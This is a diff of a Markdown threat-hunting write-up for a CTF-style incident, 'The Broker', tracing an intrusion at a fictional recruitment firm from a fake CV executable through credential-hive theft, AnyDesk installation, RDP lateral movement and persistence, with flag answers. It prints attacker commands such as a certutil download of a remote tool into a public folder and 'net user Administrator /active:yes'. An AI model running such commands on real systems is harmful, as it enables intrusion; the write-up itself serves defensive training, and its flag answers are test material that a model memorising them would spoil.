@@ -9,11 +9,11 @@
 9. [Appendix C: CTF Flags]()
 ## Incident Overview
 
-**The Broker**
-Organization: Ashford Sterling Recruitment
-Timeframe; 15 JAN 2026
-Status: Ongoing
-Analyst Assigned: `Fasi Sika`
+**The Broker** <br>
+Organization: Ashford Sterling Recruitment <br>
+Timeframe; 15 JAN 2026 <br>
+Status: Ongoing <br>
+Analyst Assigned: `Fasi Sika` <br>
 Report Date: 25 FEB 2026
 
 A compromised user account is being used to conduct interactive attack activity. This behavior is indicative of an attacker who has gained access to valid credentials and is manually executing commands on the system.
@@ -37,7 +37,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `daniel_richardson_cv.pdf.exe`
+**Finding**: `daniel_richardson_cv.pdf.exe` <br>
 **Timestamp**: `2026-01-15T03:58:55.6563735Z`
 
 </details>
@@ -58,7 +58,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5`
+**Finding**: `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5` <br>
 **Timestamp**: `2026-01-15T03:58:55.6563735Z`
 
 </details>
@@ -81,12 +81,12 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `explorer.exe`
+**Finding**: `explorer.exe` <br>
 **Timestamp**: `2026-01-15T03:58:55.6563735Z`
 
 </details>
 #### 🚩Flag 4: Suspicious Child Process
-Question: What legitimate Windows process was spawned?
+**Question**: What legitimate Windows process was spawned?
 
 After `daniel_richardson_cv.pdf.exe` as executed, the file spawned the Windows process, `notepad.exe`, a legitimate Windows executable commonly used to open and modify text files. Attackers use legitimate system binaries to host malicious code or execute payloads under a trusted process to evade detection.
 
@@ -106,7 +106,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `notepad.exe`
+**Finding**: `notepad.exe` <br>
 **Timestamp**: `2026-01-15T05:09:53.3995975Z`
 
 </details>
@@ -140,7 +140,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `notepad.exe ""`
+**Finding**: `notepad.exe ""` <br>
 **Timestamp**: `2026-01-15T05:09:53.3995975Z`
 
 </details>
@@ -167,7 +167,7 @@ DeviceNetworkEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `cdn.cloud-endpoint.net`
+**Finding**: `cdn.cloud-endpoint.net` <br>
 **Timestamp**: `2026-01-15T04:04:33.2301079Z`
 
 </details>
@@ -191,7 +191,7 @@ DeviceNetworkEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `daniel_richardson_cv.pdf.exe`
+**Finding**: `daniel_richardson_cv.pdf.exe` <br>
 **Timestamp**: `2026-01-15T03:47:10.786699Z`
 
 </details>
@@ -220,7 +220,7 @@ DeviceNetworkEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `sync.cloud-endpoint.net`
+**Finding**: `sync.cloud-endpoint.net` <br>
 **Timestamp**: `2026-01-15T04:52:23.0978038Z`
 
 </details>
@@ -254,7 +254,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `SAM, SYSTEM`
+**Finding**: `SAM, SYSTEM` <br>
 **Timestamp**: `2026-01-15T04:13:32.7652183Z`
 
 </details>
@@ -277,7 +277,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `C:\Users\Public`
+**Finding**: `C:\Users\Public` <br>
 **Timestamp**: `2026-01-15T04:13:32.7652183Z`
 
 </details>
@@ -301,7 +301,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `sophie.turner`
+**Finding**: `sophie.turner` <br>
 **Timestamp**: `2026-01-15T04:13:32.7652183Z`
 
 </details>
@@ -326,7 +326,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `whoami.exe`
+**Finding**: `whoami.exe` <br>
 **Timestamp**: `2026-01-15T03:58:55.6563735Z`
 
 </details>
@@ -348,7 +348,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `net.exe view`
+**Finding**: `net.exe view` <br>
 **Timestamp**: `2026-01-15T04:01:32.0791816Z`
 
 </details>
@@ -371,7 +371,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `administrators`
+**Finding**: `administrators` <br>
 **Timestamp**: `2026-01-15T04:01:19.1611938Z`
 
 </details>
@@ -397,7 +397,7 @@ DeviceFileEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `Anydesk`
+**Finding**: `Anydesk` <br>
 **Timestamp**: `2026-01-15T04:08:31.0759602Z`
 
 </details>
@@ -422,7 +422,7 @@ DeviceFileEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532`
+**Finding**: `f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532` <br>
 **Timestamp**: `2026-01-15T04:08:31.0759602Z`
 
 </details>
@@ -431,7 +431,7 @@ DeviceFileEvents
 **Question**: The tool was downloaded using a native Windows binary. What binary/executable was used?
 
 The attacker downloaded the remote tool using the Windows utility `certuitl.exe` using the following command: 
-```PowerShell
+```cmd
 certutil  -urlcache -split -f https://download.anydesk.com/AnyDesk.exe C:\Users\Public\AnyDesk.exe
 ```
 
@@ -451,7 +451,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `certutil`
+**Finding**: `certutil` <br>
 **Timestamp**: `2026-01-15T04:08:31.0759602Z`
 
 </details>
@@ -478,7 +478,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf`
+**Finding**: `C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf` <br>
 **Timestamp**: `2026-01-15T04:11:13.5896114Z`
 
 </details>
@@ -507,7 +507,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `intrud3r!`
+**Finding**: `intrud3r!` <br>
 **Timestamp**: `2026-01-15T04:11:47.1679716Z
 
 </details>
@@ -573,7 +573,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `WMIC.EXE, PsExec.exe`
+**Finding**: `WMIC.EXE, PsExec.exe` <br>
 **Timestamp**: `2026-01-15T04:18:44.6123349Z`
 
 </details>
@@ -597,7 +597,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `as-pc2`
+**Finding**: `as-pc2` <br>
 **Timestamp**: `2026-01-15T04:18:44.6123349Z`
 
 </details>
@@ -605,7 +605,7 @@ DeviceProcessEvents
 **Question**: After failed attempts,  a different method achieved lateral movement. What windows executable was used?
 
 After multiple failed attempts using `WMIC.exe` and `PsExec.exe`, the attacker was able to laterally move successfully using `mstsc.exe`:
-```PowerShell
+```cmd
 "mstsc.exe" /v:10.1.0.203
 ```
 
@@ -623,7 +623,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `mstsc.exe`
+**Finding**: `mstsc.exe` <br>
 **Timestamp**: `2026-01-15T04:29:43.9940417Z`
 
 </details>
@@ -647,7 +647,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `as-pc1 > as-pc2 > as-srv
+**Finding**: `as-pc1 > as-pc2 > as-srv`
 
 </details>
 
@@ -670,7 +670,7 @@ DeviceLogonEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `david.mitchell`
+**Finding**: `david.mitchell` <br>
 **Timestamp**: `2026-01-15T04:54:55.7957282Z`
 
 </details>
@@ -679,7 +679,7 @@ DeviceLogonEvents
 **Question**: What net.exe parameter was used to activate the account?
 
 The attacker enabled a previously disabled account using the following command: 
-```PowerShell
+```cmd
 "net.exe" user Administrator /active:yes
 ```
 
@@ -699,7 +699,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `/active:yes`
+**Finding**: `/active:yes` <br>
 **Timestamp**: `2026-01-15T04:40:31.9488698Z`
 
 </details>
@@ -760,7 +760,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `MicrosoftEdgeUpdateCheck`
+**Finding**: `MicrosoftEdgeUpdateCheck` <br>
 **Timestamp**: `2026-01-15T04:52:32.6871861Z`
 
 </details>
@@ -784,7 +784,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `RuntimeBroker.exe`
+**Finding**: `RuntimeBroker.exe` <br>
 **Timestamp**: `2026-01-15T04:52:32.6871861Z`
 
 </details>
@@ -838,7 +838,7 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-**Finding**: `svc_backup`
+**Finding**: `svc_backup` <br>
 **Timestamp**: `2026-01-15T04:57:47.0153078Z`
 
 </details>
